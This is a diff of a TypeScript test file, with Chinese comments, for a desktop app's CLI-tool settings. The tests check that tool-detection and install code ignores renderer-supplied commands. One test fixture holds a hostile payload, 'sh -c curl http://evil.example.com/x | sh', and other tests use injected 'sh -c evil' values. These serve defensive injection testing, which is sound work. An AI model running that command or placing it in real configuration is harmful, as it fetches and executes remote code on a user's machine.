@@ -765,17 +765,15 @@ describe('Settings - mergeSettings 通用合并', () => {
 // CLI 工具清单：与适配器注册表对齐
 // ============================================
 
-/** 从注册表的 npm 安装方式里取出包名（去掉 @latest —— 包名校验不接受它）。 */
-function npmPackageOf(descriptor: {
+/** 从注册表的 npm 安装方式里取出**原始**包名（可能带 @latest）。 */
+function npmPackageRaw(descriptor: {
   installMethods: Array<{ type: string; command: string }>
 }): string | undefined {
   const npm = descriptor.installMethods.find((m) => m.type === 'npm')
   if (!npm) return undefined
   const parts = npm.command.split(/\s+/)
   const idx = parts.indexOf('-g')
-  const raw = idx >= 0 ? parts[idx + 1] : undefined
-  if (!raw) return undefined
-  return raw.endsWith('@latest') ? raw.slice(0, -'@latest'.length) : raw
+  return idx >= 0 ? parts[idx + 1] : undefined
 }
 
 describe('Settings - CLI 工具清单', () => {
@@ -800,6 +798,13 @@ describe('Settings - CLI 工具清单', () => {
     expect(names).not.toContain('mindmap-internal')
   })
 
+  it('claude-code / codex 的 command 被钉住（注册表里它们是 sdk 型，没有 detectCommand）', async () => {
+    const { readSettings } = await import('../settings')
+    const tools = (await readSettings()).cliTools
+    expect(tools.find((t) => t.name === 'claude-code')?.command).toBe('claude')
+    expect(tools.find((t) => t.name === 'codex')?.command).toBe('codex')
+  })
+
   it('cliTools 的 command / npmPackage 与适配器注册表一致', async () => {
     const { ADAPTER_REGISTRY } = await import('../adapters/registry')
     const { readSettings } = await import('../settings')
@@ -818,15 +823,27 @@ describe('Settings - CLI 工具清单', () => {
         tool.detectArgs ?? ['--version'],
         `${d.name} 的探测参数不一致`,
       ).toEqual(d.detectArgs ?? ['--version'])
-      const pkg = npmPackageOf(d)
+      const pkg = npmPackageRaw(d)
       if (pkg) {
-        expect(tool.npmPackage, `${d.name} 的 npm 包名不一致`).toBe(pkg)
-        // validateNpmPackageName 不接受 @latest —— 直接抄注册表会装不上
-        expect(tool.npmPackage).not.toContain('@latest')
+        // 注册表里有的安装命令带 @latest（opencode / qwen-code）——
+        // validateNpmPackageName 不接受它，settings 里必须是去掉后的包名
+        expect(tool.npmPackage, `${d.name} 的 npm 包名不一致`).toBe(pkg.replace(/@latest$/, ''))
       } else {
         // 没有 npm 安装方式（cursor 走官网下载）：不能给一个会失败的包名
         expect(tool.npmPackage, `${d.name} 没有 npm 安装方式，npmPackage 应为空`).toBe('')
       }
+    }
+  })
+
+  it('cliTools 里的包名都通不过 installCliTool 的包名校验就会装不上', async () => {
+    const { readSettings } = await import('../settings')
+    const tools = (await readSettings()).cliTools
+    // 与 installCliTool 里的 validateNpmPackageName 同一套规则，但独立实现 ——
+    // 免得「用被测逻辑验证被测逻辑」
+    const VALID_PACKAGE = /^(@[\w~-][\w.~-]*\/)?[\w~-][\w.~-]*$/
+    for (const tool of tools) {
+      if (!tool.npmPackage) continue // cursor：没有 npm 包
+      expect(tool.npmPackage, `${tool.name} 的包名通不过校验`).toMatch(VALID_PACKAGE)
     }
   })
 
@@ -896,6 +913,152 @@ describe('Settings - CLI 工具探测参数', () => {
     await detectCliTool('claude-code')
 
     expect(mockSpawnSync).toHaveBeenCalledWith('claude', ['--version'], expect.anything())
+  })
+})
+
+describe('Settings - 渲染进程不能决定主进程执行什么命令', () => {
+  beforeEach(() => {
+    mockFsData.clear()
+    vi.clearAllMocks()
+    vi.resetModules()
+  })
+
+  /** 敌意载荷：渲染进程经 settings:write 能写进 settings.json 的东西。 */
+  const HOSTILE = {
+    name: 'evil',
+    command: 'sh',
+    detectArgs: ['-c', 'curl http://evil.example.com/x | sh'],
+    npmPackage: 'evil-package',
+    installed: false,
+  }
+
+  it('settings.json 里的敌意条目绝不会被 spawn（事实源之外的名字不探测）', async () => {
+    const { refreshAllCliStatus } = await import('../settings')
+    // 模拟敌意载荷已经落在磁盘上（老版本写的、或被手改过的文件）
+    mockFsData.set(`${mockUserDataPath}/settings.json`, JSON.stringify({
+      version: 1,
+      cliTools: [HOSTILE],
+      apiKeys: [],
+      mcpServers: [],
+    }))
+    mockSpawnSync.mockReturnValue({ status: 1, stdout: '', stderr: '', error: undefined })
+
+    await refreshAllCliStatus()
+
+    // 一个 'sh' 都没跑过，也没有 -c 这类参数
+    expect(mockSpawnSync.mock.calls.some(([cmd]) => cmd === 'sh')).toBe(false)
+    expect(
+      mockSpawnSync.mock.calls.some(([, args]) => Array.isArray(args) && args.includes('-c')),
+    ).toBe(false)
+  })
+
+  it('已知名（cursor）的存档里即使塞了敌意参数，探测也只用事实源的参数', async () => {
+    const { detectCliTool } = await import('../settings')
+    mockFsData.set(`${mockUserDataPath}/settings.json`, JSON.stringify({
+      version: 1,
+      cliTools: [{ ...HOSTILE, name: 'cursor' }],
+      apiKeys: [],
+      mcpServers: [],
+    }))
+    mockSpawnSync.mockReturnValue({ status: 0, stdout: '0.42.0\n', stderr: '', error: undefined })
+
+    const detected = await detectCliTool('cursor')
+
+    expect(mockSpawnSync).toHaveBeenCalledWith('cursor', ['agent', '--version'], expect.anything())
+    expect(mockSpawnSync.mock.calls.some(([cmd]) => cmd === 'sh')).toBe(false)
+    expect(detected.installed).toBe(true)
+  })
+
+  it('事实源之外的名字直接返回未安装，且不 spawn', async () => {
+    const { detectCliTool } = await import('../settings')
+    mockFsData.set(`${mockUserDataPath}/settings.json`, JSON.stringify({
+      version: 1,
+      cliTools: [HOSTILE],
+      apiKeys: [],
+      mcpServers: [],
+    }))
+
+    const detected = await detectCliTool('evil')
+
+    expect(detected.installed).toBe(false)
+    expect(mockSpawnSync).not.toHaveBeenCalled()
+  })
+
+  it('installCliTool 拒绝事实源之外的名字（不能被塞任意 npm 包）', async () => {
+    const { installCliTool } = await import('../settings')
+    mockFsData.set(`${mockUserDataPath}/settings.json`, JSON.stringify({
+      version: 1,
+      cliTools: [HOSTILE],
+      apiKeys: [],
+      mcpServers: [],
+    }))
+
+    const result = await installCliTool('evil')
+
+    expect(result.success).toBe(false)
+    // 连 npm 都不该被碰到
+    expect(mockSpawnSync).not.toHaveBeenCalled()
+  })
+
+  it('installCliTool 对没有 npm 包的工具说「只能手动安装」（不是「非法的包名」）', async () => {
+    const { installCliTool } = await import('../settings')
+
+    const cursor = await installCliTool('cursor')
+    const unknown = await installCliTool('not-a-tool-at-all')
+
+    expect(cursor.success).toBe(false)
+    expect(cursor.message).toContain('cursor')
+    // 与「未知工具」的提示不是同一句
+    expect(cursor.message).not.toBe(unknown.message)
+    expect(mockSpawnSync).not.toHaveBeenCalled()
+  })
+
+  it('写路径按事实源归一化：文件与缓存里都是事实源的值，用户态的 installed 保留', async () => {
+    const { writeSettings, readSettings, invalidateSettingsCache } = await import('../settings')
+    const base = await readSettings()
+
+    await writeSettings({
+      ...base,
+      cliTools: [
+        // 渲染进程试图改掉事实：command / detectArgs / npmPackage 都不算数
+        { name: 'cursor', command: 'sh', detectArgs: ['-c', 'evil'], npmPackage: 'evil-pkg', installed: true },
+        { name: 'cline', command: 'sh', detectArgs: ['-c', 'evil'], npmPackage: 'evil-pkg', installed: false },
+      ],
+    })
+
+    // 内存缓存
+    const cached = await readSettings()
+    const cachedCursor = cached.cliTools.find((c) => c.name === 'cursor')
+    expect(cachedCursor?.command).toBe('cursor')
+    expect(cachedCursor?.detectArgs).toEqual(['agent', '--version'])
+    expect(cachedCursor?.npmPackage).toBe('')
+    // 用户态字段（用户机器上的真实状态）不能被默认值抹掉
+    expect(cachedCursor?.installed).toBe(true)
+
+    // 磁盘上
+    invalidateSettingsCache()
+    const onDisk = JSON.parse(mockFsData.get(`${mockUserDataPath}/settings.json`)!) as {
+      cliTools: Array<{ name: string; command: string; detectArgs?: string[]; npmPackage: string; installed: boolean }>
+    }
+    const diskCursor = onDisk.cliTools.find((c) => c.name === 'cursor')
+    expect(diskCursor?.command).toBe('cursor')
+    expect(diskCursor?.detectArgs).toEqual(['agent', '--version'])
+    expect(diskCursor?.npmPackage).toBe('')
+    expect(diskCursor?.installed).toBe(true)
+  })
+
+  it('写进 settings 的 API Key 不会污染默认值常量（默认配置必须是独立副本）', async () => {
+    const { setApiKey, readSettings, invalidateSettingsCache } = await import('../settings')
+    // 首次启动走 ENOENT 分支：默认配置对象是浅拷贝出来的
+    await readSettings()
+    await setApiKey('anthropic', 'sk-must-not-leak')
+    // 模拟另一个全新安装：磁盘上没有这个文件
+    mockFsData.clear()
+    invalidateSettingsCache()
+
+    const fresh = await readSettings()
+
+    expect(fresh.apiKeys).toEqual([])
   })
 })
 
